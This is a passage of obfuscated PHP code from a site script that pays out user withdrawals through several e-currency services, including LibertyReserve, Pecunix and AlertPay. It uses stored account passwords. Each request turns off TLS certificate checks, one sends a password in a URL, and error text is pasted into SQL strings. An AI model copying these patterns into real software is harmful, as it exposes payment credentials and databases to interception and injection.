      curl_setopt ($elnlcGUFH, CURLOPT_POSTFIELDS, 'AccountID=' . rawurlencode ($elnlcGWAnG[$elnlcFAei['elnlcsWQzi']]) . '&PassPhrase=' . rawurlencode ($elnlcfkaO) . '&Payee_Account=' . rawurlencode ($elnlcrIPNm) . '&Amount=' . rawurlencode ($elnlcLMULg) . '&PAY_IN=' . rawurlencode ($elnlcGWAnG[$elnlcFAei['elnlcNDGyh']]) . ('' . '&WORTH_OF=Gold&Memo=' . $elnlcoWGTg . '&IGNORE_RATE_CHANGE=y'));
      curl_setopt ($elnlcGUFH, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcGUFH, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcGUFH);
      curl_close ($elnlcGUFH);
      $elnlcCDlqo = array ();
      if (preg_match ('/<input type=hidden name=PAYMENT_BATCH_NUM VALUE="(\\d+)">/ims', $a, $elnlcCDlqo))
      {
        return array (1, '', $elnlcCDlqo[1]);
      }
      else
      {
        if (preg_match ('/<input type=hidden name=ERROR VALUE="(.*?)">/ims', $a, $elnlcCDlqo))
        {
          $elnlcpLkhm = preg_replace ('/&lt;/i', '<', $elnlcCDlqo[1]);
          $elnlcpLkhm = preg_replace ('/&gt;/i', '>', $elnlcpLkhm);
          $e = elnlcqedaf ('' . $elnlcqokow . ' ' . $elnlcpLkhm);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcqokow . ('' . ' ' . $elnlcpLkhm), '');
        }
        else
        {
          $e = elnlcqedaf ('' . $elnlcqokow . ' Unknown error');
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcqokow . ' Unknown error', '');
        }
      }
    }
    else
    {
      $e = elnlcqedaf ('' . $elnlcqokow . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcqokow . ' Curl functions are not available');
    }

  }

  function elnlcogve ($elnlchAzqM, $elnlcLMULg, $elnlcrIPNm, $elnlcoWGTg, $elnlcqokow)
  {
    global $elnlcFAei;
    global $elnlcGWAnG;
    if ($elnlcGWAnG[$elnlcFAei['elnlcGSktp']] == $elnlcFAei['elnlcIHTwl'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcGWAnG[$elnlcFAei['elnlcBJpk']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcrIPNm == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to AlertPay account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid AlertPay account', '');
    }

    list ($elnlcisgS, $elnlcjzLUA) = elnlcqsbia ($elnlcrIPNm, 11);
    if ($elnlcisgS == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcjzLUA . '\'';
      mysql_query ($q);
      return array (0, $elnlcjzLUA);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlchAzqM == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'alertpay_account_password\'';
        $elnlcSQAa = mysql_query ($q);
        while ($elnlctLoC = mysql_fetch_array ($elnlcSQAa))
        {
          $elnlcTqIf = elnlcuexwr ($elnlctLoC[$elnlcFAei['elnlccdshL']], $elnlcFAei['elnlceUUg']);
        }
      }
      else
      {
        $elnlcTqIf = $elnlchAzqM;
      }

      $elnlcGUFH = curl_init ();
      $elnlcoWGTg = rawurlencode ($elnlcoWGTg);
      $elnlcqcAV = sprintf ('USER=%s&PASSWORD=%s&AMOUNT=%s&CURRENCY=%s&RECEIVEREMAIL=%s&SENDEREMAIL=%s&PURCHASETYPE=%s&NOTE=%s&TESTMODE=%s', urlencode ($elnlcGWAnG[$elnlcFAei['elnlcfNRu']]), urlencode ($elnlcTqIf), urlencode ($elnlcLMULg), 'USD', urlencode ($elnlcrIPNm), '', 0, urlencode ($elnlcoWGTg), 0);
      curl_setopt ($elnlcGUFH, CURLOPT_URL, $elnlcFAei['elnlcduLk']);
      curl_setopt ($elnlcGUFH, CURLOPT_POST, true);
      curl_setopt ($elnlcGUFH, CURLOPT_POSTFIELDS, $elnlcqcAV);
      curl_setopt ($elnlcGUFH, CURLOPT_RETURNTRANSFER, true);
      curl_setopt ($elnlcGUFH, CURLOPT_HEADER, false);
      curl_setopt ($elnlcGUFH, CURLOPT_TIMEOUT, 30);
      curl_setopt ($elnlcGUFH, CURLOPT_SSL_VERIFYPEER, false);
      $a = curl_exec ($elnlcGUFH);
      curl_close ($elnlcGUFH);
      parse_str (urldecode ($a), $elnlcwGjKn);
      $elnlcCDlqo = array ();
      if ($elnlcwGjKn[$elnlcFAei['elnlceDftk']] == 100)
      {
        return array (1, '', $elnlcwGjKn[$elnlcFAei['elnlcWWJD']]);
      }
      else
      {
        if (200 < $elnlcwGjKn[$elnlcFAei['elnlceDftk']])
        {
          $elnlcpLkhm = $elnlcwGjKn[$elnlcFAei['elnlceDftk']] . ': ' . $elnlcwGjKn[$elnlcFAei['elnlcFUPN']];
          $e = elnlcqedaf ('' . $elnlcqokow . ' ' . $elnlcpLkhm);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcqokow . ('' . ' ' . $elnlcpLkhm), '');
        }
        else
        {
          $e = elnlcqedaf ('' . $elnlcqokow . ' Unknown error');
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcqokow . ' Unknown error', '');
        }
      }
    }
    else
    {
      $e = elnlcqedaf ('' . $elnlcqokow . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcqokow . ' Curl functions are not available');
    }

  }

  function elnlccsauc ($elnlchAzqM, $elnlcLMULg, $elnlcrIPNm, $elnlcoWGTg, $elnlcqokow)
  {
    global $elnlcFAei;
    global $elnlcGWAnG;
    $elnlcLMULg = sprintf ('%0.2f', floor ($elnlcLMULg * 100) / 100);
    if ($elnlcGWAnG[$elnlcFAei['elnlcBJpk']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcrIPNm == 0)
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can not process withdrawal to Evocash account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid EvoCash account', '');
    }

    list ($elnlcisgS, $elnlcjzLUA) = elnlcqsbia ($elnlcrIPNm, 1);
    if ($elnlcisgS == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcjzLUA . '\'';
      mysql_query ($q);
      return array (0, $elnlcjzLUA);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlchAzqM == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'evocash_account_password\'';
        $elnlcSQAa = mysql_query ($q);
        while ($elnlctLoC = mysql_fetch_array ($elnlcSQAa))
        {
          $elnlckgtKr = elnlcuexwr ($elnlctLoC[$elnlcFAei['elnlccdshL']], $elnlcFAei['elnlceUUg']);
        }

        $q = 'select v from hm2_pay_settings where n=\'evocash_transaction_code\'';
        $elnlcSQAa = mysql_query ($q);
        while ($elnlctLoC = mysql_fetch_array ($elnlcSQAa))
        {
          $elnlcqLgw = elnlcuexwr ($elnlctLoC[$elnlcFAei['elnlccdshL']], $elnlcFAei['elnlceUUg']);
        }
      }
      else
      {
        list ($elnlckgtKr, $elnlcqLgw) = preg_split ('/\\|/', $elnlchAzqM);
      }

      $elnlcGUFH = curl_init ();
      $elnlcoWGTg = rawurlencode ($elnlcoWGTg);
      curl_setopt ($elnlcGUFH, CURLOPT_URL, 'https://www.evocash.com/evoswift/instantpayment.cfm?payingaccountid=' . rawurlencode ($elnlcGWAnG[$elnlcFAei['elnlcWhop']]) . '&username=' . rawurlencode ($elnlcGWAnG[$elnlcFAei['elnlcNnDL']]) . '&password=' . rawurlencode ($elnlckgtKr) . '&transaction_code=' . rawurlencode ($elnlcqLgw) . '&amount=' . rawurlencode ($elnlcLMULg) . ('' . '&reference=&memo=' . $elnlcoWGTg . '&receivingaccountid=') . rawurlencode ($elnlcrIPNm) . '');
      curl_setopt ($elnlcGUFH, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcGUFH, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcGUFH);
      curl_close ($elnlcGUFH);
      $elnlcCDlqo = array ();
      if (preg_match ('/<INPUT TYPE="Hidden" NAME="PayingTransactionID" VALUE="(.*?)">/ims', $a, $elnlcCDlqo))
      {
        return array (1, '', $elnlcCDlqo[1]);
      }
      else
      {
        if (preg_match ('/<INPUT TYPE="Hidden" NAME="Error" VALUE="(.*?)">/ims', $a, $elnlcCDlqo))
        {
          $elnlcpLkhm = $elnlcCDlqo[1];
          $e = elnlcqedaf ('' . $elnlcqokow . ' ' . $elnlcpLkhm);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcqokow . ('' . ' ' . $elnlcpLkhm), '');
        }
        else
        {
          $e = elnlcqedaf ('' . $elnlcqokow . ' Unknown error');
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcqokow . ' Unknown error', '');
        }
      }
    }
    else
    {
      $e = elnlcqedaf ('' . $elnlcqokow . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcqokow . ' Curl functions are not available');
    }

  }

  function elnlcvwszd ($elnlchAzqM, $elnlcLMULg, $elnlcrIPNm, $elnlcoWGTg, $elnlcqokow)
  {
    global $elnlcFAei;
    global $elnlcGWAnG;
    if ($elnlcGWAnG[$elnlcFAei['elnlcGSktp']] == $elnlcFAei['elnlcIHTwl'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcGWAnG[$elnlcFAei['elnlcBJpk']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcrIPNm == 0)
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to IntGold account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid IntGold account', '');
    }

    list ($elnlcisgS, $elnlcjzLUA) = elnlcqsbia ($elnlcrIPNm, 2);
    if ($elnlcisgS == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcjzLUA . '\'';
      mysql_query ($q);
      return array (0, $elnlcjzLUA);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlchAzqM == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'intgold_password\'';
        $elnlcSQAa = mysql_query ($q);
        while ($elnlctLoC = mysql_fetch_array ($elnlcSQAa))
        {
          $elnlcAEjdA = elnlcuexwr ($elnlctLoC[$elnlcFAei['elnlccdshL']], $elnlcFAei['elnlceUUg']);
        }
      }
      else
      {
        $elnlcAEjdA = $elnlchAzqM;
      }

      if ($elnlchAzqM == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'intgold_password\'';
        $elnlcSQAa = mysql_query ($q);
        while ($elnlctLoC = mysql_fetch_array ($elnlcSQAa))
        {
          $elnlcAEjdA = elnlcuexwr ($elnlctLoC[$elnlcFAei['elnlccdshL']], $elnlcFAei['elnlceUUg']);
        }

        $q = 'select v from hm2_pay_settings where n=\'intgold_transaction_code\'';
        $elnlcSQAa = mysql_query ($q);
        while ($elnlctLoC = mysql_fetch_array ($elnlcSQAa))
        {
          $elnlcFEwnx = elnlcuexwr ($elnlctLoC[$elnlcFAei['elnlccdshL']], $elnlcFAei['elnlceUUg']);
        }
      }
      else
      {
        list ($elnlcAEjdA, $elnlcFEwnx) = preg_split ('/\\|/', $elnlchAzqM);
      }

      $elnlcGUFH = curl_init ();
      $elnlcoWGTg = rawurlencode ($elnlcoWGTg);
      curl_setopt ($elnlcGUFH, CURLOPT_URL, 'https://intgold.com/cgi-bin/autopay.cgi');
      curl_setopt ($elnlcGUFH, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcGUFH, CURLOPT_POST, 1);
      curl_setopt ($elnlcGUFH, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)');
      curl_setopt ($elnlcGUFH, CURLOPT_POSTFIELDS, 'ACCOUNTID=' . rawurlencode ($elnlcGWAnG[$elnlcFAei['elnlcULjAi']]) . '&PASSWORD=' . rawurlencode ($elnlcAEjdA) . '&SECPASSWORD=' . rawurlencode ($elnlcFEwnx) . '&RECEIVER=' . rawurlencode ($elnlcrIPNm) . '&AMOUNT=' . rawurlencode ($elnlcLMULg) . '&NOTE=' . $elnlcoWGTg);
      curl_setopt ($elnlcGUFH, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt ($elnlcGUFH, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcGUFH);
      curl_close ($elnlcGUFH);
      $elnlcCDlqo = array ();
      if (preg_match ('' . '/Success\\s*TRANSACTION_ID:(.*?)$/ims', $a, $elnlcCDlqo))
      {
        return array (1, '', $elnlcCDlqo[1]);
      }
      else
      {
        $e = elnlcqedaf ('' . $elnlcqokow . ' ' . $a);
        $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
        mysql_query ($q);
        return array (0, $elnlcqokow . ('' . ' ' . $a), '');
      }
    }
    else
    {
      $e = elnlcqedaf ('' . $elnlcqokow . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcqokow . ' Curl functions are not available');
    }

  }

  function elnlcgoqo ($elnlchAzqM, $elnlcLMULg, $elnlcrIPNm, $elnlcoWGTg, $elnlcqokow)
  {
    global $elnlcFAei;
    global $elnlcGWAnG;
    if ($elnlcGWAnG[$elnlcFAei['elnlcGSktp']] == $elnlcFAei['elnlcIHTwl'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcGWAnG[$elnlcFAei['elnlcBJpk']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcrIPNm == 0)
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to eeeCureency account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid eeeCurrency account', '');
    }

    list ($elnlcisgS, $elnlcjzLUA) = elnlcqsbia ($elnlcrIPNm, 8);
    if ($elnlcisgS == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcjzLUA . '\'';
      mysql_query ($q);
      return array (0, $elnlcjzLUA);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlchAzqM == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'eeecurrency_password\'';
        $elnlcSQAa = mysql_query ($q);
        while ($elnlctLoC = mysql_fetch_array ($elnlcSQAa))
        {
          $elnlcbBENI = elnlcuexwr ($elnlctLoC[$elnlcFAei['elnlccdshL']], $elnlcFAei['elnlceUUg']);
        }

        $q = 'select v from hm2_pay_settings where n=\'eeecurrency_transaction_code\'';
        $elnlcSQAa = mysql_query ($q);
        while ($elnlctLoC = mysql_fetch_array ($elnlcSQAa))
        {
          $elnlcrMcBK = elnlcuexwr ($elnlctLoC[$elnlcFAei['elnlccdshL']], $elnlcFAei['elnlceUUg']);
        }
      }
      else
      {
        list ($elnlcbBENI, $elnlcrMcBK) = preg_split ('/\\|/', $elnlchAzqM);
      }

      $elnlcGUFH = curl_init ();
      $elnlcoWGTg = rawurlencode ($elnlcoWGTg);
      curl_setopt ($elnlcGUFH, CURLOPT_URL, 'https://eeecurrency.com/cgi-bin/autopay.cgi');
      curl_setopt ($elnlcGUFH, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcGUFH, CURLOPT_POST, 1);
      curl_setopt ($elnlcGUFH, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)');
      curl_setopt ($elnlcGUFH, CURLOPT_POSTFIELDS, 'ACCOUNTID=' . rawurlencode ($elnlcGWAnG[$elnlcFAei['elnlcBSFo']]) . '&PASSWORD=' . rawurlencode ($elnlcbBENI) . '&SECPASSWORD=' . rawurlencode ($elnlcrMcBK) . '&RECEIVER=' . rawurlencode ($elnlcrIPNm) . '&AMOUNT=' . rawurlencode ($elnlcLMULg) . ('' . '&NOTE=' . $elnlcoWGTg));
      curl_setopt ($elnlcGUFH, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcGUFH);
      curl_close ($elnlcGUFH);
      $elnlcCDlqo = array ();
      if (preg_match ('' . '/Success\\s*TRANSACTION_ID:(.*?)$/ims', $a, $elnlcCDlqo))
      {
        return array (1, '', $elnlcCDlqo[1]);
      }
      else
      {
        $e = elnlcqedaf ('' . $elnlcqokow . ' ' . $a);
        $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
        mysql_query ($q);
        return array (0, $elnlcqokow . ('' . ' ' . $a), '');
      }
    }
    else
    {
      $e = elnlcqedaf ('' . $elnlcqokow . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcqokow . ' Curl functions are not available');
    }

  }

  function elnlcpprq ($elnlchAzqM, $elnlcLMULg, $elnlcrIPNm, $elnlcoWGTg, $elnlcqokow)
  {
    global $elnlcFAei;
    global $elnlcGWAnG;
    if ($elnlcGWAnG[$elnlcFAei['elnlcGSktp']] == $elnlcFAei['elnlcIHTwl'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcGWAnG[$elnlcFAei['elnlcBJpk']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcrIPNm == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to empty Pecunix account.\'';
      mysql_query ($q);
      return array (0, 'Invalid Pecunix account', '');
    }

    list ($elnlcisgS, $elnlcjzLUA) = elnlcqsbia ($elnlcrIPNm, 9);
    if ($elnlcisgS == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcjzLUA . '\'';
      mysql_query ($q);
      return array (0, $elnlcjzLUA);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlchAzqM == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'pecunix_password\'';
        $elnlcSQAa = mysql_query ($q);
        while ($elnlctLoC = mysql_fetch_array ($elnlcSQAa))
        {
          $elnlcuDQLQ = elnlcuexwr ($elnlctLoC[$elnlcFAei['elnlccdshL']], $elnlcFAei['elnlceUUg']);
        }
      }
      else
      {
        $elnlcuDQLQ = $elnlchAzqM;
      }

      $elnlcGUFH = curl_init ();
      $elnlcvklWm = elnlcpehpk ('{px_time}');
      $elnlcwTIz = strtoupper (md5 ($elnlcuDQLQ . ':' . $elnlcvklWm));
      $elnlcqcAV = '
    <TransferRequest>
      <Transfer>
        <TransferId> </TransferId>
        <Payer> ' . htmlentities ($elnlcGWAnG[$elnlcFAei['elnlcybnB']], ENT_NOQUOTES) . ' </Payer>
        <Payee> ' . htmlentities ($elnlcrIPNm, ENT_NOQUOTES) . ' </Payee>
        <CurrencyId> GAU </CurrencyId>
        <Equivalent>
          <CurrencyId> USD </CurrencyId>
          <Amount> ' . htmlentities ($elnlcLMULg, ENT_NOQUOTES) . ' </Amount>
        </Equivalent>
        <FeePaidBy> Payee </FeePaidBy>
        <Memo> ' . htmlentities ($elnlcoWGTg, ENT_NOQUOTES) . ('' . ' </Memo>
      </Transfer>
      <Auth>
        <Token> ' . $elnlcwTIz . ' </Token>
      </Auth>
    </TransferRequest>
    ');
      $elnlcGUFH = curl_init ();
      curl_setopt ($elnlcGUFH, CURLOPT_URL, 'https://pxi.pecunix.com/money.refined...transfer');
      curl_setopt ($elnlcGUFH, CURLOPT_POST, 1);
      curl_setopt ($elnlcGUFH, CURLOPT_POSTFIELDS, $elnlcqcAV);
      curl_setopt ($elnlcGUFH, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcGUFH, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcGUFH);
      curl_close ($elnlcGUFH);
      $elnlctcyj = elnlclqmra ($a);
      if ($elnlctcyj[$elnlcFAei['elnlcJzws']] == $elnlcFAei['elnlcGJIRG'])
      {
        return array (1, '', $elnlctcyj[$elnlcFAei['elnlcvQzwa']]);
      }
      else
      {
        if ($elnlctcyj[$elnlcFAei['elnlcJzws']] == $elnlcFAei['elnlccgjlv'])
        {
          $e = elnlcqedaf ('' . $elnlcqokow . ' ' . $elnlctcyj[$elnlcFAei['elnlcAIzUn']] . ' ' . $elnlctcyj[$elnlcFAei['elnlcOBtk']]);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
        else
        {
          $e = elnlcqedaf ('' . $elnlcqokow . ' Parse error: ' . $a);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
      }
    }
    else
    {
      $e = elnlcqedaf ('' . $elnlcqokow . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcqokow . ' Curl functions are not available');
    }

  }

  function elnlcvhkqb ($elnlchAzqM, $elnlcLMULg, $elnlcrIPNm, $elnlcoWGTg, $elnlcqokow)
  {
    global $elnlcFAei;
    global $elnlcGWAnG;
    if ($elnlcGWAnG[$elnlcFAei['elnlcGSktp']] == $elnlcFAei['elnlcIHTwl'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcGWAnG[$elnlcFAei['elnlcBJpk']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcrIPNm == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to empty LibertyReserve account.\'';
      mysql_query ($q);
      return array (0, 'Invalid LibertyReserve account', '');
    }

    list ($elnlcisgS, $elnlcjzLUA) = elnlcqsbia ($elnlcrIPNm, 15);
    if ($elnlcisgS == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcjzLUA . '\'';
      mysql_query ($q);
      return array (0, $elnlcjzLUA);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlchAzqM == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'libertyreserve_password\'';
        $elnlcSQAa = mysql_query ($q);
        while ($elnlctLoC = mysql_fetch_array ($elnlcSQAa))
        {
          $elnlcrSkcW = elnlcuexwr ($elnlctLoC[$elnlcFAei['elnlccdshL']], $elnlcFAei['elnlceUUg']);
        }

        $elnlcSLeFC = $elnlcGWAnG[$elnlcFAei['elnlcEmgkj']];
      }
      else
      {
        list ($elnlcrSkcW, $elnlcSLeFC) = preg_split ('/\\|/', $elnlchAzqM);
      }

      $elnlcGUFH = curl_init ();
      $elnlcwTIz = strtoupper (elnlcpehpk ($elnlcrSkcW . ':{lr_time}'));
      $elnlcqcAV = '<TransferRequest id="' . rand (1000000, 9999999) . '">
  <Auth>
    <ApiName>' . htmlspecialchars ($elnlcSLeFC) . ('' . '</ApiName>
    <Token>' . $elnlcwTIz . '</Token>
  </Auth>
  <Transfer>
    <TransferType>transfer</TransferType>
    <Payer>') . htmlentities ($elnlcGWAnG[$elnlcFAei['elnlchESV']], ENT_NOQUOTES) . '</Payer>
    <Payee>' . htmlentities ($elnlcrIPNm, ENT_NOQUOTES) . '</Payee>
    <CurrencyId>' . htmlentities ($elnlcGWAnG[$elnlcFAei['elnlcxuUV']]) . '</CurrencyId>
    <Amount>' . htmlentities ($elnlcLMULg, ENT_NOQUOTES) . '</Amount>
    <Memo>' . htmlentities ($elnlcoWGTg, ENT_NOQUOTES) . '</Memo>
    <Anonymous>false</Anonymous>
  </Transfer>
</TransferRequest>';
      $elnlcGUFH = curl_init ();
      curl_setopt ($elnlcGUFH, CURLOPT_URL, 'https://api.libertyreserve.com/xml/transfer.aspx?req=' . urlencode ($elnlcqcAV));
      curl_setopt ($elnlcGUFH, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcGUFH, CURLOPT_RETURNTRANSFER, 1);
      $elnlconxJh = array ('User-Agent: Mozilla/5.0');
      curl_setopt ($elnlcGUFH, CURLOPT_HTTPHEADER, $elnlconxJh);
      $a = curl_exec ($elnlcGUFH);
      curl_close ($elnlcGUFH);
      $elnlcGWAnG[$elnlcFAei['elnlctyfQ']] = $elnlcqcAV;
      $elnlcGWAnG[$elnlcFAei['elnlcpEOVi']] = $a;
      $elnlctcyj = elnlcveefn ($a);
      if ($elnlctcyj[$elnlcFAei['elnlcJzws']] == $elnlcFAei['elnlcGJIRG'])
      {
        return array (1, '', $elnlctcyj[$elnlcFAei['elnlcvQzwa']]);
      }
      else
      {
        if ($elnlctcyj[$elnlcFAei['elnlcJzws']] == $elnlcFAei['elnlccgjlv'])
        {
          $e = elnlcqedaf ('' . $elnlcqokow . ' ' . $elnlctcyj[$elnlcFAei['elnlcAIzUn']] . '<br>' . $elnlctcyj[$elnlcFAei['elnlcOBtk']]);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
        else
        {
          $e = elnlcqedaf ('' . $elnlcqokow . ' Parse error: ' . $a);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
      }
    }
    else
    {
      $e = elnlcqedaf ('' . $elnlcqokow . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcqokow . ' Curl functions are not available');
    }

  }

  function elnlccgym ($elnlchAzqM, $elnlcLMULg, $elnlcrIPNm, $elnlcoWGTg, $elnlcqokow)
  {
    global $elnlcFAei;
    global $elnlcGWAnG;
    if ($elnlcGWAnG[$elnlcFAei['elnlcGSktp']] == $elnlcFAei['elnlcIHTwl'])
    {
    }

    if ($elnlcGWAnG[$elnlcFAei['elnlcBJpk']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcrIPNm == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to empty V-Money account.\'';
      mysql_query ($q);
      return array (0, 'Invalid V-Money account', '');
    }

    list ($elnlcisgS, $elnlcjzLUA) = elnlcqsbia ($elnlcrIPNm, 16);
    if ($elnlcisgS == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcjzLUA . '\'';
      mysql_query ($q);
      return array (0, $elnlcjzLUA);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlchAzqM == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'vmoney_password\'';
        $elnlcSQAa = mysql_query ($q);
        while ($elnlctLoC = mysql_fetch_array ($elnlcSQAa))
        {
          $elnlcoDdKH = elnlcuexwr ($elnlctLoC[$elnlcFAei['elnlccdshL']], $elnlcFAei['elnlceUUg']);
        }
      }
      else
      {
        $elnlcoDdKH = $elnlchAzqM;
      }

      $elnlcwTIz = md5 ($elnlcGWAnG[$elnlcFAei['elnlcERFA']] . $elnlcoDdKH . elnlcpehpk ('{vm_time}'));
      $elnlcqcAV = '<Request>
	<Type>Transfer</Type>
	<Auth>
		<AccountId>' . htmlentities ($elnlcGWAnG[$elnlcFAei['elnlcERFA']], ENT_NOQUOTES) . ('' . '</AccountId>
		<Token>' . $elnlcwTIz . '</Token>
	</Auth>
	<Transfers>
		<Transfer>
			<ID>1</ID>
			<Payee>') . htmlentities ($elnlcrIPNm, ENT_NOQUOTES) . '</Payee>
			<Amount>' . htmlentities ($elnlcLMULg, ENT_NOQUOTES) . '</Amount>
			<Memo>' . htmlentities ($elnlcoWGTg, ENT_NOQUOTES) . '</Memo>
		</Transfer>
	</Transfers>
        </Request>';
      $elnlcGUFH = curl_init ();
      curl_setopt ($elnlcGUFH, CURLOPT_URL, 'https://www.v-money.net/vai.php');
      curl_setopt ($elnlcGUFH, CURLOPT_POST, 1);
      curl_setopt ($elnlcGUFH, CURLOPT_POSTFIELDS, 'request_data=' . $elnlcqcAV);
      curl_setopt ($elnlcGUFH, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcGUFH, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcGUFH);
      curl_close ($elnlcGUFH);
      $elnlctcyj = elnlcqwgh ($a);
      if ($elnlctcyj[$elnlcFAei['elnlcJzws']] == $elnlcFAei['elnlcGJIRG'])
      {
        return array (1, '', $elnlctcyj[$elnlcFAei['elnlcvQzwa']]);
      }
      else
      {
        if ($elnlctcyj[$elnlcFAei['elnlcJzws']] == $elnlcFAei['elnlccgjlv'])
        {
          $e = elnlcqedaf ('' . $elnlcqokow . ' ' . $elnlctcyj[$elnlcFAei['elnlcAIzUn']]);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
